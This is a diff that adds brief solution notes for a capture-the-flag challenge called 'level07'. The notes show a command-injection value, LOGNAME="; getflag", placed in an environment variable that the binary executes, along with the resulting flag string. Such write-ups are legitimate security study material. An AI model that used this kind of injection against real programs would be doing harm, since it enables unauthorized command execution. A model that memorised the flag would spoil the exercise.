@@ -1,0 +1,9 @@
+Inspect file level07
+- exec env var
+
+Environment variable injection 
+- export LOGNAME="; getflag"
+
+Run
+- ./level07
+-> fiumuikeil55xe9cu4dood66h
